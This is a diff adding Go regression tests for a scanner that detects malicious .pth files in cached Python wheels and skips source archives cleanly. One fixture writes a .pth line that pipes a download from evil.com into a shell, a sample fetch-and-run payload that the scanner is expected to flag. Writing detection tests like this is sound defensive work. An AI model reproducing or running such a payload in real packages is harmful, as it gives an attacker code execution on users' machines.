@@ -139,6 +139,65 @@ func TestPTHInspector_MaliciousPTHInWheel_StillScannedViaFilename(t *testing.T) 
 	assert.NotEmpty(t, result.Findings)
 }
 
+func TestPTHInspector_MaliciousWheel_CachePathNoFilename_StillScannedViaID(t *testing.T) {
+	// Regression: the rescan scheduler builds scanner.Artifact without Filename
+	// (internal/scheduler/rescan.go), and cache backends hand back extensionless
+	// temp paths (e.g. shieldoo-s3-cache-*, *.tmp). With only the LocalPath
+	// fallback, the ".whl" suffix check missed and a malicious cached wheel was
+	// reported CLEAN on manual rescan. The scanner must recover the wheel name
+	// from the PyPI artifact ID's 4th colon segment
+	// (ecosystem:name:version:filename), which is reliable where LocalPath is not.
+	dir := t.TempDir()
+	cachePath := filepath.Join(dir, "shieldoo-s3-cache-abc123") // no extension
+	f, err := os.Create(cachePath)
+	require.NoError(t, err)
+	w := zip.NewWriter(f)
+	fw, err := w.Create("evil.pth")
+	require.NoError(t, err)
+	_, err = fw.Write([]byte("import os; os.system('curl http://evil.com | sh')"))
+	require.NoError(t, err)
+	require.NoError(t, w.Close())
+	require.NoError(t, f.Close())
+
+	s := builtin.NewPTHInspector()
+	result, err := s.Scan(context.Background(), scanner.Artifact{
+		ID:        "pypi:test-pkg:1.0.0:test_pkg-1.0.0-py3-none-any.whl",
+		Ecosystem: scanner.EcosystemPyPI,
+		Name:      "test-pkg",
+		Version:   "1.0.0",
+		LocalPath: cachePath, // extensionless cache path
+		// Filename intentionally empty — mirrors rescan.go.
+	})
+
+	require.NoError(t, err)
+	assert.Equal(t, scanner.VerdictMalicious, result.Verdict)
+	assert.NotEmpty(t, result.Findings)
+}
+
+func TestPTHInspector_SdistViaID_CachePathNoFilename_SkipsCleanly(t *testing.T) {
+	// Inverse of the wheel case: a cached sdist on rescan (no Filename,
+	// extensionless cache path) must still be recognised as a non-wheel from the
+	// artifact ID and skipped cleanly, never force-opened as a zip.
+	dir := t.TempDir()
+	cachePath := filepath.Join(dir, "shieldoo-s3-cache-def456")
+	require.NoError(t, os.WriteFile(cachePath, []byte("not a zip archive"), 0o600))
+
+	s := builtin.NewPTHInspector()
+	result, err := s.Scan(context.Background(), scanner.Artifact{
+		ID:        "pypi:test-pkg:1.0.0:test-pkg-1.0.0.tar.gz",
+		Ecosystem: scanner.EcosystemPyPI,
+		Name:      "test-pkg",
+		Version:   "1.0.0",
+		LocalPath: cachePath,
+		// Filename intentionally empty.
+	})
+
+	require.NoError(t, err)
+	assert.Equal(t, scanner.VerdictClean, result.Verdict)
+	assert.Empty(t, result.Findings)
+	assert.NoError(t, result.Error)
+}
+
 func TestPTHInspector_SupportedEcosystems_OnlyPyPI(t *testing.T) {
 	s := builtin.NewPTHInspector()
 	ecosystems := s.SupportedEcosystems()
